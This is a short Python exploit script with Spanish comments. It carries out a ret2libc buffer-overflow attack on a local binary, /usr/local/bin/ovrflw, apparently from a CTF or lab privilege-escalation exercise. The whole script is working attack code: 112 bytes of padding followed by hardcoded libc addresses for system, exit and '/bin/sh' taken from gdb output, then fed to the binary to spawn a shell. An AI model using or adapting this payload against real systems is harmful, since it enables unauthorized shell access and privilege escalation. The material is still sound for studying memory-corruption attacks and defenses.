#!/usr/bin/python3
#coding: utf-8

import signal, sys
from struct import pack
from subprocess import call

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n\n")
        sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def exploit():

        # EIP -> system + exit + bin_sh (Llamada al sistema)

#gdb-peda$ p system
#$1 = {<text variable, no debug info>} 0xb7e62310 <__libc_system>
#gdb-peda$ p exit
#$2 = {<text variable, no debug info>} 0xb7e55260 <__GI_exit>
#gdb-peda$ find "/bin/sh"
#Searching for '/bin/sh' in: None ranges
#Found 1 results, display max 1 items:
#libc : 0xb7f84bac ("/bin/sh")

        system_address = pack("<I", 0xb7e62310)
        exit_address = pack("<I", 0xb7e55260)
        bin_sh_address = pack("<I", 0xb7f84bac)

        offset = 112
        before_eip = b"A"*offset
        eip = system_address + exit_address + bin_sh_address

        payload = before_eip + eip # ret2libc

        return payload

if __name__ == '__main__':

        payload = exploit()

        response = call(["/usr/local/bin/ovrflw", payload])
